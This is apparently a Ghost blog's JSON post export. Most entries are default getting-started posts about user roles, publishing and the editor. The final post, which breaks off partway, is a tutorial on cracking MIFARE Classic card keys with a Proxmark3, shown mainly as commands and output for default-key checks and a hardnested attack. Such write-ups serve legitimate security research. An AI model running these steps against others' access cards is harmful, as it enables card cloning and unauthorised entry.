to be allowed to publish their own posts, they should be set as Contributors.</p><p><strong>Editors</strong><br>Editors are the 3rd user level in Ghost. Editors can do everything that an Author can do, but they can also edit and publish the posts of others - as well as their own. Editors can also invite new Contributors+Authors to the site.</p><p><strong>Administrators</strong><br>The top user level in Ghost is Administrator. Again, administrators can do everything that Authors and Editors can do, but they can also edit all site settings and data, not just content. Additionally, administrators have full access to invite, manage or remove any other user of the site.<br><br><strong>The Owner</strong><br>There is only ever one owner of a Ghost site. The owner is a special user which has all the same permissions as an Administrator, but with two exceptions: The Owner can never be deleted. And in some circumstances the owner will have access to additional special settings if applicable. For example: billing details, if using <a href=\"https://ghost.org/pricing/\"><strong>Ghost(Pro)</strong></a>.</p><blockquote><em>It's a good idea to ask all of your users to fill out their user profiles, including bio and social links. These will populate rich structured data for posts and generally create more opportunities for themes to fully populate their design.</em></blockquote><p>Next up: <a href=\"/organising-content/\">Organising your content</a> </p>","comment_id":"5d2754b5992f0652efb50e74","plaintext":"There are a couple of things to do next while you're getting set up:\n\nMake your site private\nIf you've got a publication that you don't want the world to see yet because\nit's not ready to launch, you can hide your Ghost site behind a basic shared\npass-phrase.\n\nYou can toggle this preference on at the bottom of Ghost's General Settings\n[/ghost/settings/general/]:\n\nGhost will give you a short, randomly generated pass-phrase which you can share\nwith anyone who needs access to the site while you're working on it. While this\nsetting is enabled, all search engine optimisation features will be switched off\nto help keep your site under the radar.\n\nDo remember though, this is not secure authentication. You shouldn't rely on\nthis feature for protecting important private data. It's just a simple, shared\npass-phrase for some very basic privacy.\n\n\n--------------------------------------------------------------------------------\n\nInvite your team \nGhost has a number of different user roles for your team:\n\nContributors\nThis is the base user level in Ghost. Contributors can create and edit their own\ndraft posts, but they are unable to edit drafts of others or publish posts.\nContributors are untrusted users with the most basic access to your publication.\n\nAuthors\nAuthors are the 2nd user level in Ghost. Authors can write, edit  and publish\ntheir own posts. Authors are trusted users. If you don't trust users to be\nallowed to publish their own posts, they should be set as Contributors.\n\nEditors\nEditors are the 3rd user level in Ghost. Editors can do everything that an\nAuthor can do, but they can also edit and publish the posts of others - as well\nas their own. Editors can also invite new Contributors+Authors to the site.\n\nAdministrators\nThe top user level in Ghost is Administrator. Again, administrators can do\neverything that Authors and Editors can do, but they can also edit all site\nsettings and data, not just content. Additionally, administrators have full\naccess to invite, manage or remove any other user of the site.\n\nThe Owner\nThere is only ever one owner of a Ghost site. The owner is a special user which\nhas all the same permissions as an Administrator, but with two exceptions: The\nOwner can never be deleted. And in some circumstances the owner will have access\nto additional special settings if applicable. For example: billing details, if\nusing Ghost(Pro) [https://ghost.org/pricing/].\n\n> It's a good idea to ask all of your users to fill out their user profiles,\nincluding bio and social links. These will populate rich structured data for\nposts and generally create more opportunities for themes to fully populate their\ndesign.\nNext up: Organising your content [/organising-content/]","feature_image":"https://static.ghost.org/v2.0.0/images/admin-settings.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2019-07-11T15:24:37.000Z","updated_at":"2019-09-04T12:54:27.000Z","published_at":"2019-07-11T15:24:39.000Z","custom_excerpt":"There are a couple of things to do next while you're getting set up: making your site private and inviting your team.","codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d2754b5992f0652efb50e76","uuid":"f0262a2e-5ac8-4290-ab54-369315d1d74c","title":"Publishing options","slug":"publishing-options","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"{\\n    \\\"@context\\\": \\\"https://schema.org\\\",\\n    \\\"@type\\\": \\\"Article\\\",\\n    \\\"publisher\\\": {\\n        \\\"@type\\\": \\\"Organization\\\",\\n        \\\"name\\\": \\\"Publishing options\\\",\\n        \\\"logo\\\": \\\"https://static.ghost.org/ghost-logo.svg\\\"\\n    },\\n    \\\"author\\\": {\\n        \\\"@type\\\": \\\"Person\\\",\\n        \\\"name\\\": \\\"Ghost\\\",\\n        \\\"url\\\": \\\"http://demo.ghost.io/author/ghost/\\\",\\n        \\\"sameAs\\\": []\\n    },\\n    \\\"headline\\\": \\\"Publishing options\\\",\\n    \\\"url\\\": \\\"http://demo.ghost.io/publishing-options\\\",\\n    \\\"datePublished\\\": \\\"2018-08-08T11:44:00.000Z\\\",\\n    \\\"dateModified\\\": \\\"2018-08-09T12:06:21.000Z\\\",\\n    \\\"keywords\\\": \\\"Getting Started\\\",\\n    \\\"description\\\": \\\"The Ghost editor has everything you need to fully optimise your content. This is where you can add tags and authors, feature a post, or turn a post into a page.\\\",\\n    }\\n}\\n    \"}]],\"markups\":[[\"a\",[\"href\",\"https://schema.org/\"]],[\"a\",[\"href\",\"https://search.google.com/structured-data/testing-tool\",\"rel\",\"noreferrer nofollow noopener\"]],[\"strong\"],[\"a\",[\"href\",\"/ghost/settings/code-injection/\"]],[\"a\",[\"href\",\"/admin-settings/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"The Ghost editor has everything you need to fully optimise your content. This is where you can add tags and authors, feature a post, or turn a post into a page. \"]]],[1,\"blockquote\",[[0,[],0,\"Access the post settings menu in the top right hand corner of the editor. \"]]],[1,\"h2\",[[0,[],0,\"Post feature image\"]]],[1,\"p\",[[0,[],0,\"Insert your post feature image from the very top of the post settings menu. Consider resizing or optimising your image first to ensure it's an appropriate size.\"]]],[1,\"h2\",[[0,[],0,\"Structured data & SEO\"]]],[1,\"p\",[[0,[],0,\"Customise your social media sharing cards for Facebook and Twitter, enabling you to add custom images, titles and descriptions for social media.\"]]],[1,\"p\",[[0,[],0,\"There’s no need to hard code your meta data. You can set your meta title and description using the post settings tool, which has a handy character guide and SERP preview. \"]]],[1,\"p\",[[0,[],0,\"Ghost will automatically implement structured data for your publication using JSON-LD to further optimise your content.\"]]],[10,0],[1,\"p\",[[0,[],0,\"You can test that the structured data \"],[0,[0],1,\"schema\"],[0,[],0,\" on your site is working as it should using \"],[0,[1],1,\"Google’s structured data tool\"],[0,[],0,\". \"]]],[1,\"h2\",[[0,[],0,\"Code Injection\"]]],[1,\"p\",[[0,[],0,\"This tool allows you to inject code on a per post or page basis, or across your entire site. This means you can modify CSS, add unique tracking codes, or add other scripts to the head or foot of your publication without making edits to your theme files. \"]]],[1,\"p\",[[0,[2],1,\"To add code site-wide\"],[0,[],0,\", use the code injection tool \"],[0,[3],1,\"in the main admin menu\"],[0,[],0,\". This is useful for adding a Facebook Pixel, a Google Analytics tracking code, or to start tracking with any other analytics tool.\"]]],[1,\"p\",[[0,[2],1,\"To add code to a post or page\"],[0,[],0,\", use the code injection tool within the post settings menu. This is useful if you want to add art direction, scripts or styles that are only applicable to one post or page. \"]]],[1,\"p\",[[0,[],0,\"From here, you might be interested in managing some more specific \"],[0,[4],1,\"admin settings\"],[0,[],0,\"!\"]]]]}","html":"<p>The Ghost editor has everything you need to fully optimise your content. This is where you can add tags and authors, feature a post, or turn a post into a page. </p><blockquote>Access the post settings menu in the top right hand corner of the editor. </blockquote><h2 id=\"post-feature-image\">Post feature image</h2><p>Insert your post feature image from the very top of the post settings menu. Consider resizing or optimising your image first to ensure it's an appropriate size.</p><h2 id=\"structured-data-seo\">Structured data &amp; SEO</h2><p>Customise your social media sharing cards for Facebook and Twitter, enabling you to add custom images, titles and descriptions for social media.</p><p>There’s no need to hard code your meta data. You can set your meta title and description using the post settings tool, which has a handy character guide and SERP preview. </p><p>Ghost will automatically implement structured data for your publication using JSON-LD to further optimise your content.</p><!--kg-card-begin: code--><pre><code>{\n    \"@context\": \"https://schema.org\",\n    \"@type\": \"Article\",\n    \"publisher\": {\n        \"@type\": \"Organization\",\n        \"name\": \"Publishing options\",\n        \"logo\": \"https://static.ghost.org/ghost-logo.svg\"\n    },\n    \"author\": {\n        \"@type\": \"Person\",\n        \"name\": \"Ghost\",\n        \"url\": \"http://demo.ghost.io/author/ghost/\",\n        \"sameAs\": []\n    },\n    \"headline\": \"Publishing options\",\n    \"url\": \"http://demo.ghost.io/publishing-options\",\n    \"datePublished\": \"2018-08-08T11:44:00.000Z\",\n    \"dateModified\": \"2018-08-09T12:06:21.000Z\",\n    \"keywords\": \"Getting Started\",\n    \"description\": \"The Ghost editor has everything you need to fully optimise your content. This is where you can add tags and authors, feature a post, or turn a post into a page.\",\n    }\n}\n    </code></pre><!--kg-card-end: code--><p>You can test that the structured data <a href=\"https://schema.org/\">schema</a> on your site is working as it should using <a href=\"https://search.google.com/structured-data/testing-tool\" rel=\"noreferrer nofollow noopener\">Google’s structured data tool</a>. </p><h2 id=\"code-injection\">Code Injection</h2><p>This tool allows you to inject code on a per post or page basis, or across your entire site. This means you can modify CSS, add unique tracking codes, or add other scripts to the head or foot of your publication without making edits to your theme files. </p><p><strong>To add code site-wide</strong>, use the code injection tool <a href=\"/ghost/settings/code-injection/\">in the main admin menu</a>. This is useful for adding a Facebook Pixel, a Google Analytics tracking code, or to start tracking with any other analytics tool.</p><p><strong>To add code to a post or page</strong>, use the code injection tool within the post settings menu. This is useful if you want to add art direction, scripts or styles that are only applicable to one post or page. </p><p>From here, you might be interested in managing some more specific <a href=\"/admin-settings/\">admin settings</a>!</p>","comment_id":"5d2754b5992f0652efb50e76","plaintext":"The Ghost editor has everything you need to fully optimise your content. This is\nwhere you can add tags and authors, feature a post, or turn a post into a page. \n\n> Access the post settings menu in the top right hand corner of the editor. \nPost feature image\nInsert your post feature image from the very top of the post settings menu.\nConsider resizing or optimising your image first to ensure it's an appropriate\nsize.\n\nStructured data & SEO\nCustomise your social media sharing cards for Facebook and Twitter, enabling you\nto add custom images, titles and descriptions for social media.\n\nThere’s no need to hard code your meta data. You can set your meta title and\ndescription using the post settings tool, which has a handy character guide and\nSERP preview. \n\nGhost will automatically implement structured data for your publication using\nJSON-LD to further optimise your content.\n\n{\n    \"@context\": \"https://schema.org\",\n    \"@type\": \"Article\",\n    \"publisher\": {\n        \"@type\": \"Organization\",\n        \"name\": \"Publishing options\",\n        \"logo\": \"https://static.ghost.org/ghost-logo.svg\"\n    },\n    \"author\": {\n        \"@type\": \"Person\",\n        \"name\": \"Ghost\",\n        \"url\": \"http://demo.ghost.io/author/ghost/\",\n        \"sameAs\": []\n    },\n    \"headline\": \"Publishing options\",\n    \"url\": \"http://demo.ghost.io/publishing-options\",\n    \"datePublished\": \"2018-08-08T11:44:00.000Z\",\n    \"dateModified\": \"2018-08-09T12:06:21.000Z\",\n    \"keywords\": \"Getting Started\",\n    \"description\": \"The Ghost editor has everything you need to fully optimise your content. This is where you can add tags and authors, feature a post, or turn a post into a page.\",\n    }\n}\n    \n\nYou can test that the structured data schema [https://schema.org/] on your site\nis working as it should using Google’s structured data tool\n[https://search.google.com/structured-data/testing-tool]. \n\nCode Injection\nThis tool allows you to inject code on a per post or page basis, or across your\nentire site. This means you can modify CSS, add unique tracking codes, or add\nother scripts to the head or foot of your publication without making edits to\nyour theme files. \n\nTo add code site-wide, use the code injection tool in the main admin menu\n[/ghost/settings/code-injection/]. This is useful for adding a Facebook Pixel, a\nGoogle Analytics tracking code, or to start tracking with any other analytics\ntool.\n\nTo add code to a post or page, use the code injection tool within the post\nsettings menu. This is useful if you want to add art direction, scripts or\nstyles that are only applicable to one post or page. \n\nFrom here, you might be interested in managing some more specific admin settings\n[/admin-settings/]!","feature_image":"https://static.ghost.org/v2.0.0/images/publishing-options.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2019-07-11T15:24:37.000Z","updated_at":"2019-09-04T12:54:21.000Z","published_at":"2019-07-11T15:24:40.000Z","custom_excerpt":"The Ghost editor has everything you need to fully optimise your content. This is where you can add tags and authors, feature a post, or turn a post into a page.","codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d2754b5992f0652efb50e78","uuid":"5de8e5c5-d2bc-4a59-ac56-b50fdb339eff","title":"Writing posts with Ghost ✍️","slug":"the-editor","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"image\",{\"src\":\"https://static.ghost.org/v2.0.0/images/formatting-editor-demo.gif\"}],[\"code\",{\"code\":\"<header class=\\\"site-header outer\\\">\\n    <div class=\\\"inner\\\">\\n        {{> \\\"site-nav\\\"}}\\n    </div>\\n</header>\"}],[\"image\",{\"src\":\"https://static.ghost.org/v2.0.0/images/using-images-demo.gif\"}]],\"markups\":[[\"strong\"],[\"code\"],[\"a\",[\"href\",\"/publishing-options/\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"Ghost has a powerful visual editor with familiar formatting options, as well as the ability to seamlessly add dynamic content. \"]]],[1,\"p\",[[0,[],0,\"Select the text to add formatting, headers or create links, or use Markdown shortcuts to do the work for you - if that's your thing. \"]]],[10,0],[1,\"h2\",[[0,[],0,\"Rich editing at your fingertips\"]]],[1,\"p\",[[0,[],0,\"The editor can also handle rich media objects, called \"],[0,[0],1,\"cards\"],[0,[],0,\". \"]]],[1,\"p\",[[0,[],0,\"You can insert a card either by clicking the  \"],[0,[1],1,\"+\"],[0,[],0,\"  button on a new line, or typing  \"],[0,[1],1,\"/\"],[0,[],0,\"  on a new line to search for a particular card. This allows you to efficiently insert\"],[0,[0],1,\" images\"],[0,[],0,\", \"],[0,[0],1,\"markdown\"],[0,[],0,\", \"],[0,[0],1,\"html\"],[0,[],0,\" and \"],[0,[0],1,\"embeds\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[0],1,\"For Example\"],[0,[],0,\":\"]]],[3,\"ul\",[[[0,[],0,\"Insert a video from YouTube directly into your content by pasting the URL \"]],[[0,[],0,\"Create unique content like a button or content opt-in using the HTML card\"]],[[0,[],0,\"Need to share some code? Embed code blocks directly \"]]]],[10,1],[1,\"h1\",[[0,[],0,\"Working with images in posts\"]]],[1,\"p\",[[0,[],0,\"You can add images to your posts in many ways:\"]]],[3,\"ul\",[[[0,[],0,\"Upload from your computer\"]],[[0,[],0,\"Click and drag an image into the browser\"]],[[0,[],0,\"Paste directly into the editor from your clipboard\"]],[[0,[],0,\"Insert using a URL\"]]]],[1,\"p\",[[0,[],0,\"Once inserted you can blend images beautifully into your content at different sizes and add captions wherever needed.\"]]],[10,2],[1,\"p\",[[0,[],0,\"The post settings menu and publishing options can be found in the top right hand corner. For more advanced tips on post settings check out the \"],[0,[2],1,\"publishing options\"],[0,[],0,\" post!\"]]],[1,\"p\",[]]]}","html":"<p>Ghost has a powerful visual editor with familiar formatting options, as well as the ability to seamlessly add dynamic content. </p><p>Select the text to add formatting, headers or create links, or use Markdown shortcuts to do the work for you - if that's your thing. </p><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"https://static.ghost.org/v2.0.0/images/formatting-editor-demo.gif\" class=\"kg-image\"></figure><!--kg-card-end: image--><h2 id=\"rich-editing-at-your-fingertips\">Rich editing at your fingertips</h2><p>The editor can also handle rich media objects, called <strong>cards</strong>. </p><p>You can insert a card either by clicking the  <code>+</code>  button on a new line, or typing  <code>/</code>  on a new line to search for a particular card. This allows you to efficiently insert<strong> images</strong>, <strong>markdown</strong>, <strong>html</strong> and <strong>embeds</strong>.</p><p><strong>For Example</strong>:</p><ul><li>Insert a video from YouTube directly into your content by pasting the URL </li><li>Create unique content like a button or content opt-in using the HTML card</li><li>Need to share some code? Embed code blocks directly </li></ul><!--kg-card-begin: code--><pre><code>&lt;header class=\"site-header outer\"&gt;\n    &lt;div class=\"inner\"&gt;\n        {{&gt; \"site-nav\"}}\n    &lt;/div&gt;\n&lt;/header&gt;</code></pre><!--kg-card-end: code--><h1 id=\"working-with-images-in-posts\">Working with images in posts</h1><p>You can add images to your posts in many ways:</p><ul><li>Upload from your computer</li><li>Click and drag an image into the browser</li><li>Paste directly into the editor from your clipboard</li><li>Insert using a URL</li></ul><p>Once inserted you can blend images beautifully into your content at different sizes and add captions wherever needed.</p><!--kg-card-begin: image--><figure class=\"kg-card kg-image-card\"><img src=\"https://static.ghost.org/v2.0.0/images/using-images-demo.gif\" class=\"kg-image\"></figure><!--kg-card-end: image--><p>The post settings menu and publishing options can be found in the top right hand corner. For more advanced tips on post settings check out the <a href=\"/publishing-options/\">publishing options</a> post!</p>","comment_id":"5d2754b5992f0652efb50e78","plaintext":"Ghost has a powerful visual editor with familiar formatting options, as well as\nthe ability to seamlessly add dynamic content. \n\nSelect the text to add formatting, headers or create links, or use Markdown\nshortcuts to do the work for you - if that's your thing. \n\nRich editing at your fingertips\nThe editor can also handle rich media objects, called cards. \n\nYou can insert a card either by clicking the+ button on a new line, or typing/ \non a new line to search for a particular card. This allows you to efficiently\ninsert images, markdown, html and embeds.\n\nFor Example:\n\n * Insert a video from YouTube directly into your content by pasting the URL \n * Create unique content like a button or content opt-in using the HTML card\n * Need to share some code? Embed code blocks directly \n\n<header class=\"site-header outer\">\n    <div class=\"inner\">\n        {{> \"site-nav\"}}\n    </div>\n</header>\n\nWorking with images in posts\nYou can add images to your posts in many ways:\n\n * Upload from your computer\n * Click and drag an image into the browser\n * Paste directly into the editor from your clipboard\n * Insert using a URL\n\nOnce inserted you can blend images beautifully into your content at different\nsizes and add captions wherever needed.\n\nThe post settings menu and publishing options can be found in the top right hand\ncorner. For more advanced tips on post settings check out the publishing options\n[/publishing-options/] post!","feature_image":"https://static.ghost.org/v2.0.0/images/writing-posts-with-ghost.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2019-07-11T15:24:37.000Z","updated_at":"2019-09-04T12:54:13.000Z","published_at":"2019-07-11T15:24:41.000Z","custom_excerpt":"Getting started with the editor is simple, with familiar formatting options in a functional toolbar and the ability to add dynamic content seamlessly.","codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d2754b5992f0652efb50e7a","uuid":"07b8311f-fa0c-49c7-965a-61b85ccad9a9","title":"Welcome to Ghost","slug":"welcome","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[],\"markups\":[[\"strong\"],[\"a\",[\"href\",\"https://ghost.org/downloads/\"]],[\"a\",[\"href\",\"https://ghost.org/pricing\"]],[\"a\",[\"href\",\"https://github.com/TryGhost\"]],[\"a\",[\"href\",\"/the-editor/\"]],[\"em\"]],\"sections\":[[1,\"p\",[[0,[],0,\"👋 Welcome, it's great to have you here.\"]]],[1,\"p\",[[0,[],0,\"We know that first impressions are important, so we've populated your new site with some initial \"],[0,[0],1,\"getting started\"],[0,[],0,\" posts that will help you get familiar with everything in no time. This is the first one!\"]]],[1,\"p\",[[0,[0],1,\"A few things you should know upfront\"],[0,[],0,\":\"]]],[3,\"ol\",[[[0,[],0,\"Ghost is designed for ambitious, professional publishers who want to actively build a business around their content. That's who it works best for. \"]],[[0,[],0,\"The entire platform can be modified and customised to suit your needs. It's very powerful, but does require some knowledge of code. Ghost is not necessarily a good platform for beginners or people who just want a simple personal blog. \"]],[[0,[],0,\"For the best experience we recommend downloading the \"],[0,[1],1,\"Ghost Desktop App\"],[0,[],0,\" for your computer, which is the best way to access your Ghost site on a desktop device. \"]]]],[1,\"p\",[[0,[],0,\"Ghost is made by an independent non-profit organisation called the Ghost Foundation. We are 100% self funded by revenue from our \"],[0,[2],1,\"Ghost(Pro)\"],[0,[],0,\" service, and every penny we make is re-invested into funding further development of free, open source technology for modern publishing.\"]]],[1,\"p\",[[0,[],0,\"The version of Ghost you are looking at right now would not have been made possible without generous contributions from the open source \"],[0,[3],1,\"community\"],[0,[],0,\".\"]]],[1,\"h2\",[[0,[],0,\"Next up, the editor\"]]],[1,\"p\",[[0,[],0,\"The main thing you'll want to read about next is probably: \"],[0,[4],1,\"the Ghost editor\"],[0,[],0,\". This is where the good stuff happens.\"]]],[1,\"blockquote\",[[0,[5],0,\"By the way, once you're done reading, you can simply delete the default \"],[0,[0],1,\"Ghost\"],[0,[],1,\" user from your team to remove all of these introductory posts! \"]]]]}","html":"<p>👋 Welcome, it's great to have you here.</p><p>We know that first impressions are important, so we've populated your new site with some initial <strong>getting started</strong> posts that will help you get familiar with everything in no time. This is the first one!</p><p><strong>A few things you should know upfront</strong>:</p><ol><li>Ghost is designed for ambitious, professional publishers who want to actively build a business around their content. That's who it works best for. </li><li>The entire platform can be modified and customised to suit your needs. It's very powerful, but does require some knowledge of code. Ghost is not necessarily a good platform for beginners or people who just want a simple personal blog. </li><li>For the best experience we recommend downloading the <a href=\"https://ghost.org/downloads/\">Ghost Desktop App</a> for your computer, which is the best way to access your Ghost site on a desktop device. </li></ol><p>Ghost is made by an independent non-profit organisation called the Ghost Foundation. We are 100% self funded by revenue from our <a href=\"https://ghost.org/pricing\">Ghost(Pro)</a> service, and every penny we make is re-invested into funding further development of free, open source technology for modern publishing.</p><p>The version of Ghost you are looking at right now would not have been made possible without generous contributions from the open source <a href=\"https://github.com/TryGhost\">community</a>.</p><h2 id=\"next-up-the-editor\">Next up, the editor</h2><p>The main thing you'll want to read about next is probably: <a href=\"/the-editor/\">the Ghost editor</a>. This is where the good stuff happens.</p><blockquote><em>By the way, once you're done reading, you can simply delete the default <strong>Ghost</strong> user from your team to remove all of these introductory posts! </em></blockquote>","comment_id":"5d2754b5992f0652efb50e7a","plaintext":"👋 Welcome, it's great to have you here.\n\nWe know that first impressions are important, so we've populated your new site\nwith some initial getting started posts that will help you get familiar with\neverything in no time. This is the first one!\n\nA few things you should know upfront:\n\n 1. Ghost is designed for ambitious, professional publishers who want to\n    actively build a business around their content. That's who it works best\n    for. \n 2. The entire platform can be modified and customised to suit your needs. It's\n    very powerful, but does require some knowledge of code. Ghost is not\n    necessarily a good platform for beginners or people who just want a simple\n    personal blog. \n 3. For the best experience we recommend downloading the Ghost Desktop App\n    [https://ghost.org/downloads/] for your computer, which is the best way to\n    access your Ghost site on a desktop device. \n\nGhost is made by an independent non-profit organisation called the Ghost\nFoundation. We are 100% self funded by revenue from our Ghost(Pro)\n[https://ghost.org/pricing] service, and every penny we make is re-invested into\nfunding further development of free, open source technology for modern\npublishing.\n\nThe version of Ghost you are looking at right now would not have been made\npossible without generous contributions from the open source community\n[https://github.com/TryGhost].\n\nNext up, the editor\nThe main thing you'll want to read about next is probably: the Ghost editor\n[/the-editor/]. This is where the good stuff happens.\n\n> By the way, once you're done reading, you can simply delete the default Ghost \nuser from your team to remove all of these introductory posts!","feature_image":"https://static.ghost.org/v2.0.0/images/welcome-to-ghost.jpg","featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"5951f5fca366002ebd5dbef7","created_at":"2019-07-11T15:24:37.000Z","updated_at":"2019-09-04T12:54:05.000Z","published_at":"2019-07-11T15:24:42.000Z","custom_excerpt":"Welcome, it's great to have you here.\nWe know that first impressions are important, so we've populated your new site with some initial getting started posts that will help you get familiar with everything in no time.","codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5d6eb8f7992f0652efb50f87","uuid":"c102969b-268d-4237-a2af-900792ca0c95","title":"Breaking Hardened MIFARE with Proxmark3","slug":"breaking-hardened-mifare-proxmark3","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"code\":\"proxmark3> hf search\\nUID : 20 2e 19 a4           \\nATQA : 00 04          \\n SAK : 08 [2]          \\nTYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1          \\nproprietary non iso14443-4 card found, RATS not supported          \\nNo chinese magic backdoor command detected          \\nPrng detection: HARDENED (hardnested)          \\n\\nValid ISO14443A Tag Found - Quiting Search\\n\"}],[\"code\",{\"code\":\"proxmark3> hf mf chk *1 ? t\\nNo key specified, trying default keys          \\nchk default key[ 0] ffffffffffff          \\nchk default key[ 1] 000000000000          \\nchk default key[ 2] a0a1a2a3a4a5          \\nchk default key[ 3] b0b1b2b3b4b5          \\nchk default key[ 4] aabbccddeeff          \\nchk default key[ 5] 1a2b3c4d5e6f          \\nchk default key[ 6] 123456789abc          \\nchk default key[ 7] 010203040506          \\nchk default key[ 8] 123456abcdef          \\nchk default key[ 9] abcdef123456          \\nchk default key[10] 4d3a99c351dd          \\nchk default key[11] 1a982c7e459a          \\nchk default key[12] d3f7d3f7d3f7          \\nchk default key[13] 714c5c886e97          \\nchk default key[14] 587ee5f9350f          \\nchk default key[15] a0478cc39091          \\nchk default key[16] 533cb6c723f6          \\nchk default key[17] 8fd0a4f256e9          \\n\\nTo cancel this operation press the button on the proxmark...          \\n--o          \\n|---|----------------|---|----------------|---|          \\n|sec|key A           |res|key B           |res|          \\n|---|----------------|---|----------------|---|          \\n|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|001|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \\n|---|----------------|---|----------------|---|          \\nFound keys have been transferred to the emulator memory\"}],[\"code\",{\"code\":\"|---|----------------|----------------|          \\n|sec|key A           |key B           |          \\n|---|----------------|----------------|          \\n|000|  ffffffffffff  |  ffffffffffff  |          \\n|001|  000000000000  |  000000000000  |          \\n|002|  ffffffffffff  |  ffffffffffff  |          \\n|003|  ffffffffffff  |  ffffffffffff  |          \\n|004|  ffffffffffff  |  ffffffffffff  |          \\n|005|  ffffffffffff  |  ffffffffffff  |          \\n|006|  ffffffffffff  |  ffffffffffff  |          \\n|007|  ffffffffffff  |  ffffffffffff  |          \\n|008|  ffffffffffff  |  ffffffffffff  |          \\n|009|  ffffffffffff  |  ffffffffffff  |          \\n|010|  ffffffffffff  |  ffffffffffff  |          \\n|011|  ffffffffffff  |  ffffffffffff  |          \\n|012|  ffffffffffff  |  ffffffffffff  |          \\n|013|  ffffffffffff  |  ffffffffffff  |          \\n|014|  ffffffffffff  |  ffffffffffff  |          \\n|015|  ffffffffffff  |  ffffffffffff  |          \\n|---|----------------|----------------|\"}],[\"code\",{\"code\":\"Sector 000 - Block 0-3\\nSector 001 - Block 4-7\\nSector 002 - Block 8-11\\nSector 003 - Block 12-15\\nSector 004 - Block 16-19\\nSector 005 - Block 20-23\\nSector 006 - Block 24-27\\nSector 007 - Block 28-31\\nSector 008 - Block 32-35\\nSector 009 - Block 36-39\\nSector 010 - Block 40-43\\nSector 011 - Block 44-47\\nSector 012 - Block 48-51\\nSector 013 - Block 52-55\\nSector 014 - Block 56-59\\nSector 015 - Block 60-63\"}],[\"code\",{\"code\":\"proxmark3> hf mf chk 0 A FFFFFFFFFFFF\\nchk key[ 0] ffffffffffff          \\n\\nFound valid key:[0:A]ffffffffffff          \"}],[\"code\",{\"code\":\"proxmark3> hf mf chk 4 A FFFFFFFFFFFF\\nchk key[ 0] ffffffffffff          \\n\\n          \\nNo valid keys found.\"}],[\"code\",{\"code\":\"proxmark3> hf mf hardnested 0 A FFFFFFFFFFFF 4 A\\n--target block no:  4, target key type:A, known target key: 0x000000000000 (not set), file action: none, Slow: No, Tests: 0\\nUsing AVX2 SIMD core.\\n\\n\\n\\n time    | #nonces | Activity                                                | expected to brute force\\n         |         |                                                         | #states         | time\\n------------------------------------------------------------------------------------------------------\\n       0 |       0 | Start using 4 threads and AVX2 SIMD core                |                 |\\n       0 |       0 | Brute force benchmark: 900 million (2^29.7) keys/s      | 140737488355328 |    2d\\n       1 |       0 | Using 235 precalculated bitflip state tables            | 140737488355328 |    2d\\n       4 |     112 | Apply bit flip properties                               |    153070288896 |  3min\\n       5 |     224 | Apply bit flip properties                               |     38262738944 |   43s\\n       6 |     336 | Apply bit flip properties                               |     33238697984 |   37s\\n       7 |     448 | Apply bit flip properties                               |     33104111616 |   37s\\n       8 |     559 | Apply bit flip properties                               |     30823223296 |   34s\\n       9 |     671 | Apply bit flip properties                               |     30728589312 |   34s\\n       9 |     783 | Apply bit flip properties                               |     30728589312 |   34s\\n      10 |     891 | Apply bit flip properties                               |     30728589312 |   34s\\n      10 |    1002 | Apply bit flip properties                               |     30728589312 |   34s\\n      11 |    1113 | Apply bit flip properties                               |     30728589312 |   34s\\n      12 |    1223 | Apply bit flip properties                               |     30728589312 |   34s\\n      13 |    1335 | Apply bit flip properties                               |     30728589312 |   34s\\n      14 |    1443 | Apply bit flip properties                               |     30728589312 |   34s\\n      15 |    1553 | Apply bit flip properties                               |     30728589312 |   34s\\n      15 |    1660 | Apply bit flip properties                               |     30728589312 |   34s\\n      17 |    1770 | Apply Sum property. Sum(a0) = 144                       |      1224898816 